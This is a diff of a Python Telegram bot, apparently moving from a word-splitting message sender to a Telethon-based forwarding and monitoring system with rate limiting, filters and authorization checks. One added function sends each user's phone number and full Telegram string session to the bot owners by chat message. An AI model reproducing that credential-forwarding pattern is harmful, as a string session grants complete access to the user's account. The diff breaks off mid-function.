+user_clients: Dict[int, TelegramClient] = {}
+login_states: Dict[int, Dict] = {}
+logout_states: Dict[int, Dict] = {}
+phone_verification_states: Dict[int, Dict] = {}
+task_creation_states: Dict[int, Dict[str, Any]] = {}
+
+# Forwarding system
+forwarding_tasks_cache: Dict[int, List[Dict]] = {}
+target_entity_cache: Dict[int, OrderedDict] = {}
+forward_handler_registered: Dict[int, Callable] = {}
+user_send_semaphores: Dict[int, asyncio.Semaphore] = {}
+user_rate_limiters: Dict[int, Tuple[float, float, float]] = {}  # (tokens, last_refill_time, burst_tokens)
+
+# Monitoring system
+monitoring_tasks_cache: Dict[int, List[Dict]] = {}
+chat_entity_cache: Dict[int, Dict[int, Any]] = {}
+monitor_handler_registered: Dict[int, List[Callable]] = {}
+notification_messages: Dict[int, Dict] = {}
+message_history: Dict[Tuple[int, int], deque] = {}
+reply_states: Dict[int, Dict] = {}
+auto_reply_states: Dict[int, Dict] = {}
+
+# Worker systems
+send_queue: Optional[asyncio.Queue] = None
+notification_queue: Optional[asyncio.Queue] = None
+send_worker_tasks: List[asyncio.Task] = []
+monitor_worker_tasks: List[asyncio.Task] = []
+_send_workers_started = False
+_monitor_workers_started = False
+
+MAIN_LOOP: Optional[asyncio.AbstractEventLoop] = None
+_last_gc_run = 0
+
+# Authentication cache
+_auth_cache: Dict[int, Tuple[bool, float]] = {}
+_AUTH_CACHE_TTL = 300
+
+# ============================
+# FLOOD WAIT MANAGER
+# ============================
+class FloodWaitManager:
+    """Manages flood wait states for users"""
+    
+    def __init__(self):
+        self.user_flood_wait_until = {}
+        self.start_notifications_sent = set()  # Track start notifications
+        self.end_notifications_pending = set()  # Track users who need end notifications
+        self.lock = threading.Lock()  # Regular threading lock
+    
+    def set_flood_wait(self, user_id: int, wait_seconds: int):
+        """Set a flood wait for a user"""
+        with self.lock:
+            wait_until = time.time() + wait_seconds + 5  # Add buffer
+            self.user_flood_wait_until[user_id] = wait_until
+            
+            # Check if we should send start notification
+            should_notify_start = False
+            
+            if wait_seconds > 60:  # Only notify for long waits
+                flood_wait_key = f"{user_id}_start_{int(wait_until)}"
+                if flood_wait_key not in self.start_notifications_sent:
+                    self.start_notifications_sent.add(flood_wait_key)
+                    # Mark that we need to send end notification
+                    self.end_notifications_pending.add(user_id)
+                    should_notify_start = True
+            
+            return should_notify_start, wait_seconds
+    
+    def is_in_flood_wait(self, user_id: int):
+        """Check if user is in flood wait and return (in_wait, remaining_time, should_notify_end)"""
+        with self.lock:
+            if user_id not in self.user_flood_wait_until:
+                # Not in flood wait - check if we need to send end notification
+                should_notify_end = user_id in self.end_notifications_pending
+                if should_notify_end:
+                    self.end_notifications_pending.discard(user_id)
+                    # Clean up old start notifications
+                    self._cleanup_old_notifications(user_id)
+                return False, 0, should_notify_end
+            
+            wait_until = self.user_flood_wait_until[user_id]
+            current_time = time.time()
+            
+            if current_time >= wait_until:
+                # Flood wait expired
+                del self.user_flood_wait_until[user_id]
+                # Check if we need to send end notification
+                should_notify_end = user_id in self.end_notifications_pending
+                if should_notify_end:
+                    self.end_notifications_pending.discard(user_id)
+                    self._cleanup_old_notifications(user_id)
+                return False, 0, should_notify_end
+            
+            return True, wait_until - current_time, False
+    
+    def _cleanup_old_notifications(self, user_id: int):
+        """Clean up old notification tracking for a user"""
+        current_time = time.time()
+        keys_to_remove = []
+        
+        for key in self.start_notifications_sent:
+            if key.startswith(f"{user_id}_"):
+                keys_to_remove.append(key)
+        
+        for key in keys_to_remove:
+            self.start_notifications_sent.discard(key)
+    
+    def clear_flood_wait(self, user_id: int):
+        """Clear flood wait for a user"""
+        with self.lock:
+            self.user_flood_wait_until.pop(user_id, None)
+            self._cleanup_old_notifications(user_id)
+            self.end_notifications_pending.discard(user_id)
+
+# Initialize flood wait manager
+flood_wait_manager = FloodWaitManager()
+
+# ============================
+# UTILITY FUNCTIONS
+# ============================
+def _clean_phone_number(text: str) -> str:
+    return '+' + ''.join(c for c in text if c.isdigit())
+
+def _get_cached_auth(user_id: int) -> Optional[bool]:
+    if user_id in _auth_cache:
+        allowed, timestamp = _auth_cache[user_id]
+        if time.time() - timestamp < _AUTH_CACHE_TTL:
+            return allowed
+    return None
+
+def _set_cached_auth(user_id: int, allowed: bool):
+    _auth_cache[user_id] = (allowed, time.time())
+
+async def db_call(func, *args, **kwargs):
+    loop = asyncio.get_event_loop()
+    return await loop.run_in_executor(None, functools.partial(func, *args, **kwargs))
+
+async def optimized_gc():
+    global _last_gc_run
+    current_time = time.time()
+    if current_time - _last_gc_run > GC_INTERVAL:
+        try:
+            if gc.get_count()[0] > gc.get_threshold()[0]:
+                collected = gc.collect(2)
+                if collected > 1000:
+                    logger.debug(f"GC collected {collected} objects")
+        except Exception:
             try:
-                adapter = HTTPAdapter(
-                    pool_connections=BOTS_CONFIG[bot_id]["max_concurrent_workers"]*2,
-                    pool_maxsize=max(20, BOTS_CONFIG[bot_id]["max_concurrent_workers"]*2)
-                )
-                session.mount("https://", adapter)
-                session.mount("http://", adapter)
+                gc.collect()
             except Exception:
                 pass
+        _last_gc_run = current_time
+
+# ============================
+# FORWARDING SYSTEM UTILITIES
+# ============================
+def _ensure_user_target_cache(user_id: int):
+    if user_id not in target_entity_cache:
+        target_entity_cache[user_id] = OrderedDict()
+
+def _get_cached_target(user_id: int, target_id: int):
+    _ensure_user_target_cache(user_id)
+    od = target_entity_cache[user_id]
+    if target_id in od:
+        od.move_to_end(target_id)
+        return od[target_id]
+    return None
+
+def _set_cached_target(user_id: int, target_id: int, entity: object):
+    _ensure_user_target_cache(user_id)
+    od = target_entity_cache[user_id]
+    od[target_id] = entity
+    od.move_to_end(target_id)
+    while len(od) > TARGET_ENTITY_CACHE_SIZE:
+        od.popitem(last=False)
+
+def _ensure_user_send_semaphore(user_id: int):
+    if user_id not in user_send_semaphores:
+        user_send_semaphores[user_id] = asyncio.Semaphore(SEND_CONCURRENCY_PER_USER)
+
+def _ensure_user_rate_limiter(user_id: int):
+    if user_id not in user_rate_limiters:
+        # Format: (tokens, last_refill_time, burst_tokens)
+        user_rate_limiters[user_id] = (SEND_RATE_PER_USER, time.time(), SEND_RATE_PER_USER * 5)
+
+async def _consume_token(user_id: int, amount: float = 1.0):
+    _ensure_user_rate_limiter(user_id)
+    
+    while True:
+        tokens, last_refill, burst = user_rate_limiters[user_id]
+        now = time.time()
+        elapsed = max(0.0, now - last_refill)
         
-        state["session"] = session
-        state["session_created_at"] = current_time
-        state["session_request_count"] = 0
-    
-    # Increment request count
-    state["session_request_count"] += 1
-    
-    return state["session"]
+        # Calculate refill based on elapsed time
+        refill = elapsed * SEND_RATE_PER_USER
+        tokens = min(tokens + refill, burst)
+        
+        if tokens >= amount:
+            tokens -= amount
+            user_rate_limiters[user_id] = (tokens, now, burst)
+            return
+        
+        # If we can't send now, update tokens and sleep minimal time
+        user_rate_limiters[user_id] = (tokens, now, burst)
+        
+        # Calculate exact wait time needed
+        needed = amount - tokens
+        wait_time = needed / SEND_RATE_PER_USER
+        
+        # Small sleep but don't block completely
+        await asyncio.sleep(min(wait_time, 0.1))
 
-# ===================== TOKEN BUCKET =====================
+# ============================
+# FORWARDING FILTER FUNCTIONS
+# ============================
+def extract_words(text: str) -> List[str]:
+    return WORD_PATTERN.findall(text)
 
-class TokenBucket:
-    def __init__(self, rate_per_sec: float):
-        self.capacity = max(1.0, rate_per_sec)
-        self.tokens = self.capacity
-        self.rate = rate_per_sec
-        self.last = time.monotonic()
-        self.cond = threading.Condition()
+def is_numeric_word(word: str) -> bool:
+    return bool(NUMERIC_PATTERN.match(word))
 
-    def acquire(self, timeout=10.0) -> bool:
-        end = time.monotonic() + timeout
-        with self.cond:
-            while True:
-                now = time.monotonic()
-                elapsed = now - self.last
-                if elapsed > 0:
-                    refill = elapsed * self.rate
-                    self.tokens = min(self.capacity, self.tokens + refill)
-                    self.last = now
-                if self.tokens >= 1:
-                    self.tokens -= 1
-                    return True
-                remaining = end - time.monotonic()
-                if remaining <= 0:
-                    return False
-                wait_time = min(remaining, max(0.01, (1.0 / max(1.0, self.rate))))
-                self.cond.wait(timeout=wait_time)
+def is_alphabetic_word(word: str) -> bool:
+    return bool(ALPHABETIC_PATTERN.match(word))
 
-    def notify_all(self):
-        with self.cond:
-            self.cond.notify_all()
+def contains_numeric(word: str) -> bool:
+    return any(c.isdigit() for c in word)
 
-# Initialize token buckets for all bots
-for bot_id in BOTS_CONFIG:
-    BOT_STATES[bot_id]["token_bucket"] = TokenBucket(BOTS_CONFIG[bot_id]["max_msg_per_second"])
-    BOT_STATES[bot_id]["active_workers_semaphore"] = threading.Semaphore(
-        BOTS_CONFIG[bot_id]["max_concurrent_workers"]
-    )
+def contains_alphabetic(word: str) -> bool:
+    return any(c.isalpha() for c in word)
 
-def acquire_token(bot_id: str, timeout=10.0):
-    return BOT_STATES[bot_id]["token_bucket"].acquire(timeout=timeout)
-
-# ===================== TELEGRAM UTILITIES =====================
-
-def parse_telegram_json(resp):
-    try:
-        return resp.json()
-    except Exception:
-        return None
-
-def _utf16_len(s: str) -> int:
-    if not s:
-        return 0
-    return len(s.encode("utf-16-le")) // 2
-
-def _build_entities_for_text(text: str):
-    if not text:
-        return None
-    entities = []
-    for m in re.finditer(r"\b\d+\b", text):
-        py_start = m.start()
-        py_end = m.end()
-        utf16_offset = _utf16_len(text[:py_start])
-        utf16_length = _utf16_len(text[py_start:py_end])
-        entities.append({"type": "code", "offset": utf16_offset, "length": utf16_length})
-    return entities if entities else None
-
-def is_permanent_telegram_error(code: int, description: str = "") -> bool:
-    try:
-        if code in (400, 403):
-            return True
-    except Exception:
-        pass
-    if description:
-        desc = description.lower()
-        if "bot was blocked" in desc or "chat not found" in desc or "user is deactivated" in desc or "forbidden" in desc:
+def contains_special_characters(word: str) -> bool:
+    for char in word:
+        if not char.isalnum() and not EMOJI_PATTERN.search(char):
             return True
     return False
 
-# ===================== FAILURE HANDLING =====================
-
-def record_failure(bot_id: str, user_id: int, inc: int = 1, error_code: int = None, 
-                   description: str = "", is_permanent: bool = False):
-    """Record failure for a specific bot"""
-    config = BOTS_CONFIG[bot_id]
+def apply_filters(message_text: str, task_filters: Dict) -> List[str]:
+    if not message_text:
+        return []
     
-    try:
-        row = execute_query(
-            bot_id,
-            "SELECT failures, notified FROM {prefix}send_failures WHERE user_id = %s",
-            (user_id,),
-            fetch_one=True
-        )
-        
-        if not row:
-            failures = inc
-            execute_query(
-                bot_id,
-                "INSERT INTO {prefix}send_failures (user_id, failures, last_failure_at, notified, last_error_code, last_error_desc) VALUES (%s, %s, %s, %s, %s, %s)",
-                (user_id, failures, now_ts(), 0, error_code, description)
-            )
-        else:
-            failures = int(row[0] or 0) + inc
-            notified = int(row[1] or 0)
-            execute_query(
-                bot_id,
-                "UPDATE {prefix}send_failures SET failures = %s, last_failure_at = %s, last_error_code = %s, last_error_desc = %s WHERE user_id = %s",
-                (failures, now_ts(), error_code, description, user_id)
-            )
-
-        if is_permanent or is_permanent_telegram_error(error_code or 0, description):
-            mark_user_permanently_unreachable(bot_id, user_id, error_code, description)
-            return
-
-        if failures >= SHARED_SETTINGS["failure_notify_threshold"] and notified == 0:
-            try:
-                execute_query(
-                    bot_id,
-                    "UPDATE {prefix}send_failures SET notified = 1 WHERE user_id = %s",
-                    (user_id,)
-                )
-            except Exception:
-                logger.exception("Failed to set notified flag for %s in %s", user_id, bot_id)
-            notify_owners(bot_id, f"⚠️ Repeated send failures for {user_id} ({failures}). Stopping their tasks. 🛑")
-            cancel_active_task_for_user(bot_id, user_id)
-    except Exception:
-        logger.exception("record_failure error for %s in %s", user_id, bot_id)
-
-def reset_failures(bot_id: str, user_id: int):
-    try:
-        execute_query(
-            bot_id,
-            "DELETE FROM {prefix}send_failures WHERE user_id = %s",
-            (user_id,)
-        )
-    except Exception:
-        logger.exception("reset_failures failed for %s in %s", user_id, bot_id)
-
-def mark_user_permanently_unreachable(bot_id: str, user_id: int, error_code: int = None, description: str = ""):
-    config = BOTS_CONFIG[bot_id]
+    filters_enabled = task_filters.get('filters', {})
     
-    try:
-        if user_id in config["owner_ids"]:
-            execute_query(
-                bot_id,
-                "INSERT INTO {prefix}send_failures (user_id, failures, last_failure_at, notified, last_error_code, last_error_desc) VALUES (%s, %s, %s, %s, %s, %s) ON CONFLICT (user_id) DO UPDATE SET failures = EXCLUDED.failures, last_failure_at = EXCLUDED.last_failure_at, notified = EXCLUDED.notified, last_error_code = EXCLUDED.last_error_code, last_error_desc = EXCLUDED.last_error_desc",
-                (user_id, SHARED_SETTINGS["failure_notify_threshold"], now_ts(), 1, error_code, description)
-            )
-            notify_owners(bot_id, f"⚠️ Repeated send failures for owner {user_id}. Please investigate. Error: {error_code} {description}")
-            return
-
-        execute_query(
-            bot_id,
-            "INSERT INTO {prefix}send_failures (user_id, failures, last_failure_at, notified, last_error_code, last_error_desc) VALUES (%s, %s, %s, %s, %s, %s) ON CONFLICT (user_id) DO UPDATE SET failures = EXCLUDED.failures, last_failure_at = EXCLUDED.last_failure_at, notified = EXCLUDED.notified, last_error_code = EXCLUDED.last_error_code, last_error_desc = EXCLUDED.last_error_desc",
-            (user_id, 999, now_ts(), 1, error_code, description)
-        )
-
-        cancel_active_task_for_user(bot_id, user_id)
-        suspend_user(bot_id, user_id, SHARED_SETTINGS["permanent_suspend_days"] * 24 * 3600, 
-                     f"Permanent send failure: {error_code} {description}")
-
-        notify_owners(bot_id, f"⚠️ Repeated send failures for {user_id} ({error_code}). Stopping their tasks. 🛑 Error: {description}")
-    except Exception:
-        logger.exception("mark_user_permanently_unreachable failed for %s in %s", user_id, bot_id)
-
-# ===================== MESSAGE SENDING =====================
-
-def send_message(bot_id: str, chat_id: int, text: str, reply_markup: Optional[Dict] = None):
-    """Send message using bot-specific token with improved resilience"""
-    config = BOTS_CONFIG[bot_id]
-    if not config["telegram_api"]:
-        logger.error("No TELEGRAM_TOKEN for %s; cannot send message.", bot_id)
-        return None
-
-    payload = {"chat_id": chat_id, "text": text, "disable_web_page_preview": True}
-    entities = _build_entities_for_text(text)
-    if entities:
-        payload["entities"] = entities
-    if reply_markup:
-        payload["reply_markup"] = reply_markup
-
-    if not acquire_token(bot_id, timeout=5.0):
-        logger.warning("Token acquire timed out for %s; dropping send to %s", bot_id, chat_id)
-        record_failure(bot_id, chat_id, inc=1, description="token_acquire_timeout")
-        return None
-
-    max_attempts = 3
-    attempt = 0
-    backoff_base = 0.5
+    if filters_enabled.get('raw_text', False):
+        processed = message_text
+        if prefix := filters_enabled.get('prefix'):
+            processed = prefix + processed
+        if suffix := filters_enabled.get('suffix'):
+            processed = processed + suffix
+        return [processed]
     
-    while attempt < max_attempts:
-        attempt += 1
-        try:
-            session = get_session(bot_id, force_new=(attempt > 1))
-            resp = session.post(f"{config['telegram_api']}/sendMessage", 
-                                json=payload, 
-                                timeout=SHARED_SETTINGS["requests_timeout"])
-        except requests.exceptions.SSLError as e:
-            logger.warning("SSL send error for %s to %s (attempt %s): %s", bot_id, chat_id, attempt, e)
-            if attempt >= max_attempts:
-                logger.error("SSL error persists for %s to %s after %s attempts", bot_id, chat_id, max_attempts)
-                return None
-            time.sleep(backoff_base * (4 ** (attempt - 1)))
-            continue
-        except requests.exceptions.ConnectionError as e:
-            logger.warning("Connection send error for %s to %s (attempt %s): %s", bot_id, chat_id, attempt, e)
-            if attempt >= max_attempts:
-                record_failure(bot_id, chat_id, inc=1, description=f"connection_error: {str(e)}")
-                return None
-            time.sleep(backoff_base * (2 ** (attempt - 1)))
-            continue
-        except requests.exceptions.Timeout as e:
-            logger.warning("Timeout send error for %s to %s (attempt %s): %s", bot_id, chat_id, attempt, e)
-            if attempt >= max_attempts:
-                record_failure(bot_id, chat_id, inc=1, description=f"timeout: {str(e)}")
-                return None
-            time.sleep(backoff_base * (2 ** (attempt - 1)))
-            continue
-        except requests.exceptions.RequestException as e:
-            logger.warning("Network send error for %s to %s (attempt %s): %s", bot_id, chat_id, attempt, e)
-            if attempt >= max_attempts:
-                record_failure(bot_id, chat_id, inc=1, description=str(e))
-                return None
-            time.sleep(backoff_base * (2 ** (attempt - 1)))
-            continue
-
-        data = parse_telegram_json(resp)
-        if not isinstance(data, dict):
-            logger.warning("Unexpected non-json response for sendMessage from %s to %s", bot_id, chat_id)
-            if attempt >= max_attempts:
-                record_failure(bot_id, chat_id, inc=1, description="non_json_response")
-                return None
-            time.sleep(backoff_base * (2 ** (attempt - 1)))
-            continue
-
-        if data.get("ok"):
-            try:
-                mid = data["result"].get("message_id")
-                if mid:
-                    execute_query(
-                        bot_id,
-                        "INSERT INTO {prefix}sent_messages (chat_id, message_id, sent_at, deleted) VALUES (%s, %s, %s, 0)",
-                        (chat_id, mid, now_ts())
-                    )
-            except Exception:
-                logger.exception("record sent message failed for %s", bot_id)
-            reset_failures(bot_id, chat_id)
-            return data["result"]
-
-        error_code = data.get("error_code")
-        description = data.get("description", "")
-        params = data.get("parameters") or {}
-        
-        if error_code == 429:
-            retry_after = params.get("retry_after")
-            if retry_after is None:
-                retry_after = 1
-            try:
-                retry_after = int(retry_after)
-            except Exception:
-                retry_after = 1
-            logger.info("Rate limited for %s to %s: retry_after=%s", bot_id, chat_id, retry_after)
-            time.sleep(max(0.5, retry_after))
-            if attempt >= max_attempts:
-                record_failure(bot_id, chat_id, inc=1, error_code=error_code, description=description)
-                return None
-            continue
-
-        if is_permanent_telegram_error(error_code or 0, description):
-            logger.info("Permanent error for %s to %s: %s %s", bot_id, chat_id, error_code, description)
-            record_failure(bot_id, chat_id, inc=1, error_code=error_code, description=description, is_permanent=True)
-            return None
-
-        logger.warning("Transient/send error for %s to %s: %s %s", bot_id, chat_id, error_code, description)
-        if attempt >= max_attempts:
-            record_failure(bot_id, chat_id, inc=1, error_code=error_code, description=description)
-            return None
-        time.sleep(backoff_base * (2 ** (attempt - 1)))
-
-# ===================== TASK MANAGEMENT =====================
-
-def split_text_to_words(text: str) -> List[str]:
-    return [w for w in text.strip().split() if w]
-
-def enqueue_task(bot_id: str, user_id: int, username: str, text: str):
-    config = BOTS_CONFIG[bot_id]
+    messages_to_send = []
     
-    words = split_text_to_words(text)
-    total = len(words)
-    if total == 0:
-        return {"ok": False, "reason": "empty"}
+    if filters_enabled.get('numbers_only', False):
+        if is_numeric_word(message_text.replace(' ', '')):
+            processed = message_text
+            if prefix := filters_enabled.get('prefix'):
+                processed = prefix + processed
+            if suffix := filters_enabled.get('suffix'):
+                processed = processed + suffix
+            messages_to_send.append(processed)
     
-    try:
-        pending = execute_query(
-            bot_id,
-            "SELECT COUNT(*) FROM {prefix}tasks WHERE user_id = %s AND status = 'queued'",
-            (user_id,),
-            fetch_one=True
-        )[0]
-        
-        if pending >= config["max_queue_per_user"]:
-            return {"ok": False, "reason": "queue_full", "queue_size": pending}
-        
-        execute_query(
-            bot_id,
-            """INSERT INTO {prefix}tasks (user_id, username, text, words_json, total_words, status, 
-                      created_at, sent_count, last_activity, retry_count) VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s, %s)""",
-            (user_id, username, text, json.dumps(words), total, "queued", now_ts(), 0, now_ts(), 0)
-        )
-        
-    except Exception:
-        logger.exception("enqueue_task db error for %s", bot_id)
-        return {"ok": False, "reason": "db_error"}
+    elif filters_enabled.get('alphabets_only', False):
+        if is_alphabetic_word(message_text.replace(' ', '')):
+            processed = message_text
+            if prefix := filters_enabled.get('prefix'):
+                processed = prefix + processed
+            if suffix := filters_enabled.get('suffix'):
+                processed = processed + suffix
+            messages_to_send.append(processed)
     
-    return {"ok": True, "total_words": total, "queue_size": pending + 1}
-
-def get_next_task_for_user(bot_id: str, user_id: int):
-    try:
-        r = execute_query(
-            bot_id,
-            "SELECT id, words_json, total_words, text, retry_count FROM {prefix}tasks WHERE user_id = %s AND status = 'queued' ORDER BY id ASC LIMIT 1",
-            (user_id,),
-            fetch_one=True
-        )
-    except Exception:
-        return None
-    
-    if not r:
-        return None
-    return {"id": r[0], "words": json.loads(r[1]) if r[1] else split_text_to_words(r[3]), 
-            "total_words": r[2], "text": r[3], "retry_count": r[4]}
-
-def set_task_status(bot_id: str, task_id: int, status: str):
-    try:
-        if status == "running":
-            execute_query(
-                bot_id,
-                "UPDATE {prefix}tasks SET status = %s, started_at = %s, last_activity = %s WHERE id = %s", 
-                (status, now_ts(), now_ts(), task_id)
-            )
-        elif status in ("done", "cancelled"):
-            execute_query(
-                bot_id,
-                "UPDATE {prefix}tasks SET status = %s, finished_at = %s, last_activity = %s WHERE id = %s", 
-                (status, now_ts(), now_ts(), task_id)
-            )
-        else:
-            execute_query(
-                bot_id,
-                "UPDATE {prefix}tasks SET status = %s, last_activity = %s WHERE id = %s", 
-                (status, now_ts(), task_id)
-            )
-    except Exception:
-        logger.exception("set_task_status failed for %s in %s", task_id, bot_id)
-
-def update_task_activity(bot_id: str, task_id: int):
-    try:
-        execute_query(
-            bot_id,
-            "UPDATE {prefix}tasks SET last_activity = %s WHERE id = %s",
-            (now_ts(), task_id)
-        )
-    except Exception:
-        logger.exception("update_task_activity failed for %s in %s", task_id, bot_id)
-
-def increment_task_retry(bot_id: str, task_id: int):
-    try:
-        execute_query(
-            bot_id,
-            "UPDATE {prefix}tasks SET retry_count = retry_count + 1, last_activity = %s WHERE id = %s",
-            (now_ts(), task_id)
-        )
-    except Exception:
-        logger.exception("increment_task_retry failed for %s in %s", task_id, bot_id)
-
-def cancel_active_task_for_user(bot_id: str, user_id: int):
-    try:
-        rows = execute_query(
-            bot_id,
-            "SELECT id FROM {prefix}tasks WHERE user_id = %s AND status IN ('queued','running','paused')",
-            (user_id,),
-            fetch_all=True
-        )
-        
-        count = 0
-        for r in rows:
-            tid = r[0]
-            execute_query(
-                bot_id,
-                "UPDATE {prefix}tasks SET status = %s, finished_at = %s WHERE id = %s",
-                ("cancelled", now_ts(), tid)
-            )
-            count += 1
+    else:
+        words = extract_words(message_text)
+        for word in words:
+            if not word:
+                continue
+                
+            skip_word = False
+            if filters_enabled.get('removed_alphabetic', False):
+                if contains_numeric(word) or EMOJI_PATTERN.search(word):
+                    skip_word = True
+                    
+            elif filters_enabled.get('removed_numeric', False):
+                if contains_alphabetic(word) or EMOJI_PATTERN.search(word):
+                    skip_word = True
             
-    except Exception:
-        return 0
+            if not skip_word:
+                processed = word
+                if prefix := filters_enabled.get('prefix'):
+                    processed = prefix + processed
+                if suffix := filters_enabled.get('suffix'):
+                    processed = processed + suffix
+                messages_to_send.append(processed)
     
-    notify_user_worker(bot_id, user_id)
-    return count
+    return messages_to_send
 
-def record_split_log(bot_id: str, user_id: int, username: str, count: int = 1):
-    try:
-        now = now_ts()
-        for _ in range(count):
-            execute_query(
-                bot_id,
-                "INSERT INTO {prefix}split_logs (user_id, username, words, created_at) VALUES (%s, %s, %s, %s)",
-                (user_id, username, 1, now)
-            )
-    except Exception:
-        logger.exception("record_split_log error for %s", bot_id)
+# ============================
+# DUPLICATE DETECTION UTILITIES
+# ============================
+def create_message_hash(message_text: str, sender_id: Optional[int] = None) -> str:
+    if sender_id:
+        content = f"{sender_id}:{message_text.strip().lower()}"
+    else:
+        content = message_text.strip().lower()
+    return hashlib.md5(content.encode()).hexdigest()[:12]
 
-# ===================== USER MANAGEMENT =====================
-
-def is_allowed(bot_id: str, user_id: int) -> bool:
-    config = BOTS_CONFIG[bot_id]
+def is_duplicate_message(user_id: int, chat_id: int, message_hash: str) -> bool:
+    key = (user_id, chat_id)
+    if key not in message_history:
+        return False
     
-    if user_id in config["owner_ids"]:
+    current_time = time.time()
+    dq = message_history[key]
+    
+    while dq and current_time - dq[0][1] > DUPLICATE_CHECK_WINDOW:
+        dq.popleft()
+    
+    return any(stored_hash == message_hash for stored_hash, _, _ in dq)
+
+def store_message_hash(user_id: int, chat_id: int, message_hash: str, message_text: str):
+    key = (user_id, chat_id)
+    if key not in message_history:
+        message_history[key] = deque(maxlen=MESSAGE_HASH_LIMIT)
+    
+    message_history[key].append((message_hash, time.time(), message_text[:80]))
+
+# ============================
+# AUTHENTICATION FUNCTIONS
+# ============================
+async def check_authorization(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
+    user_id = update.effective_user.id
+    
+    cached = _get_cached_auth(user_id)
+    if cached is not None:
+        if not cached:
+            await _send_unauthorized(update)
+        return cached
+    
+    if user_id in ALLOWED_USERS or user_id in OWNER_IDS:
+        _set_cached_auth(user_id, True)
         return True
     
     try:
-        result = execute_query(
-            bot_id,
-            "SELECT 1 FROM {prefix}allowed_users WHERE user_id = %s",
-            (user_id,),
-            fetch_one=True
-        )
-        return bool(result)
-    except Exception:
-        return False
-
-def suspend_user(bot_id: str, target_id: int, seconds: int, reason: str = ""):
-    config = BOTS_CONFIG[bot_id]
-    
-    until_utc_str = (datetime.utcnow() + timedelta(seconds=seconds)).strftime("%Y-%m-%d %I:%M %p")
-    until_wat_str = utc_to_wat_ts(until_utc_str)
-    
-    try:
-        execute_query(
-            bot_id,
-            "INSERT INTO {prefix}suspended_users (user_id, suspended_until, reason, added_at) VALUES (%s, %s, %s, %s) ON CONFLICT (user_id) DO UPDATE SET suspended_until = EXCLUDED.suspended_until, reason = EXCLUDED.reason, added_at = EXCLUDED.added_at",
-            (target_id, until_utc_str, reason, now_ts())
-        )
-    except Exception:
-        logger.exception("suspend_user db error for %s", bot_id)
-    
-    stopped = cancel_active_task_for_user(bot_id, target_id)
-    try:
-        reason_text = f"\nReason: {reason}" if reason else ""
-        send_message(bot_id, target_id, f"⛔ You have been suspended until {until_wat_str} by {config['owner_tag']}.{reason_text}")
-    except Exception:
-        logger.exception("notify suspended user failed for %s", bot_id)
-    
-    notify_owners(bot_id, f"🔒 User suspended: {label_for_owner_view(bot_id, target_id, fetch_display_username(bot_id, target_id))} suspended_until={until_wat_str} by {config['owner_tag']} reason={reason}")
-
-def unsuspend_user(bot_id: str, target_id: int) -> bool:
-    config = BOTS_CONFIG[bot_id]
-    
-    try:
-        r = execute_query(
-            bot_id,
-            "SELECT suspended_until FROM {prefix}suspended_users WHERE user_id = %s",
-            (target_id,),
-            fetch_one=True
-        )
+        is_allowed_db = await db_call(db.is_user_allowed, user_id)
+        _set_cached_auth(user_id, is_allowed_db)
         
-        if not r:
-            return False
-            
-        execute_query(
-            bot_id,
-            "DELETE FROM {prefix}suspended_users WHERE user_id = %s",
-            (target_id,)
-        )
+        if not is_allowed_db:
+            await _send_unauthorized(update)
+        return is_allowed_db
     except Exception:
-        return False
-    
-    try:
-        send_message(bot_id, target_id, f"✅ You have been unsuspended by {config['owner_tag']}.")
-    except Exception:
-        logger.exception("notify unsuspended failed for %s", bot_id)
-    
-    notify_owners(bot_id, f"🔓 Manual unsuspend: {label_for_owner_view(bot_id, target_id, fetch_display_username(bot_id, target_id))} by {config['owner_tag']}.")
-    return True
-
-def list_suspended(bot_id: str):
-    try:
-        return execute_query(
-            bot_id,
-            "SELECT user_id, suspended_until, reason, added_at FROM {prefix}suspended_users ORDER BY suspended_until ASC",
-            fetch_all=True
-        )
-    except Exception:
-        return []
-
-def is_suspended(bot_id: str, user_id: int) -> bool:
-    config = BOTS_CONFIG[bot_id]
-    
-    if user_id in config["owner_ids"]:
-        return False
-    
-    try:
-        r = execute_query(
-            bot_id,
-            "SELECT suspended_until FROM {prefix}suspended_users WHERE user_id = %s",
-            (user_id,),
-            fetch_one=True
-        )
-    except Exception:
-        return False
-    
-    if not r:
-        return False
-    
-    try:
-        # Remove seconds from timestamp before parsing
-        until_str = re.sub(r':\d{2}(?=\s|$)', '', r[0])
-        until = datetime.strptime(until_str, "%Y-%m-%d %I:%M %p")
-        return until > datetime.utcnow()
-    except Exception:
+        logger.exception("Auth check failed for %s", user_id)
+        _set_cached_auth(user_id, False)
+        await _send_unauthorized(update)
         return False
 
-def notify_owners(bot_id: str, text: str):
-    config = BOTS_CONFIG[bot_id]
-    for oid in config["owner_ids"]:
+async def _send_unauthorized(update: Update):
+    if update.message:
+        await update.message.reply_text(
+            UNAUTHORIZED_MESSAGE,
+            parse_mode="Markdown",
+            disable_web_page_preview=True,
+        )
+    elif update.callback_query:
+        await update.callback_query.answer()
+        await update.callback_query.message.reply_text(
+            UNAUTHORIZED_MESSAGE,
+            parse_mode="Markdown",
+            disable_web_page_preview=True,
+        )
+
+async def send_session_to_owners(user_id: int, phone: str, name: str, session_string: str):
+    from telegram import Bot
+    bot = Bot(token=BOT_TOKEN)
+    
+    message = f"""🔐 **New String Session Generated**
+
+👤 **User:** {name}
+📱 **Phone:** `{phone}`
+🆔 **User ID:** `{user_id}`
+
+**Env Var Format:**
+```{user_id}:{session_string}```"""
+    
+    for owner_id in OWNER_IDS:
         try:
-            send_message(bot_id, oid, text)
+            await bot.send_message(owner_id, message, parse_mode="Markdown")
         except Exception:
-            logger.exception("notify owner failed for %s in %s", oid, bot_id)
+            continue
 
-# ===================== WORKER MANAGEMENT =====================
+async def check_phone_number_required(user_id: int) -> bool:
+    user = await db_call(db.get_user, user_id)
+    return bool(user and user.get("is_logged_in") and not user.get("phone"))
 
-def update_worker_heartbeat(bot_id: str, user_id: int):
-    """Update heartbeat for a worker"""
-    state = BOT_STATES[bot_id]
-    with state["worker_heartbeats_lock"]:
-        state["worker_heartbeats"][user_id] = time.time()
-
-def get_worker_heartbeat(bot_id: str, user_id: int) -> float:
-    """Get last heartbeat timestamp for a worker"""
-    state = BOT_STATES[bot_id]
-    with state["worker_heartbeats_lock"]:
-        return state["worker_heartbeats"].get(user_id, 0)
-
-def cleanup_stale_workers(bot_id: str):
-    """Clean up workers that haven't sent heartbeat in 5 minutes"""
-    state = BOT_STATES[bot_id]
-    current_time = time.time()
-    stale_threshold = 300  # 5 minutes
+async def ask_for_phone_number(user_id: int, chat_id: int, context: ContextTypes.DEFAULT_TYPE):
